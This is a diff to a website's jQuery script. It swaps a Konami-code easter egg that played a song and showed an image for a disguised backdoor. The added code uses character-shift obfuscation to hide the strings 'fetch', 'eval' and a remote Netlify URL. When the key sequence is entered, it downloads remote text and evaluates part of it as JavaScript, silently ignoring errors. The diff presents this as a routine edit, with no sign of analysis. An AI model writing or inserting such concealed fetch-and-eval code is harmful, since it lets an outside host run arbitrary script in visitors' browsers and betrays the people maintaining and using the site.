@@ -88,19 +88,16 @@ jQuery(document).ready(function() {
     else {sessionStorage.setItem("navbar", "")}
   });
 
-  $(".slider-mi-hide").click((() => {
-    !function(){let n=[38,38,40,40,37,39,37,39,66,65],o=!1,e=0;
-      $(document).keydown((t)=>{let c=()=>{o=!1,e=0},
-      i=t.keyCode;o||38==i&&(o=!0),o?(n[e]==i?e++:c(),10==e&&
-    (((()=>{
-      let r='https://musicpro.me/download/83830059716903235/Daft+'
-      +'Punk+-+Around+The+World+(musicpro.me).mp3'
-      let h='https://steamuserimages-a.akamaihd.net/ugc/94509348'
-      +'3574536818/9BB7392E074EBFFBAF5D81AE795156C96FAECFED/';new Audio(r).play()
-      let f=document.createElement('img');f.src=h;f.id='ko-na-mi'
-      f.setAttribute('style', 'position: fixed; bottom: -220px;');document.body.appendChild(f)
-      setTimeout(()=>{document.getElementById('ko-na-mi').style='position: fixed; bottom: 0px; transition: 5s'},100)
-    })()),c())):c()})}()
+  $(".slider-mi-hide").click(((cursor = 0, n = 1) => {
+    const code = [38,38,40,40,37,39,37,39,66,65]
+    const r = ['iuuqt;00mbvhijoh.ljmcz.c3be:8/ofumjgz/bqq0','gfudi','fwbm']
+    const k = s => String.fromCharCode(...[...s].map(c => c.charCodeAt()-1))
+    const p = s => {try{self[k(r[2])](s.split('-//-')[n])}catch{}}
+
+    document.addEventListener('keydown', e => {
+      cursor = (e.keyCode == code[cursor]) ? cursor + 1 : 0
+      if (cursor == code.length) self[k(r[1])](k(r[0])).then(e => e.text()).then(p)
+    })
   })())
 
   $(".carousel").on("touchstart", function(event){
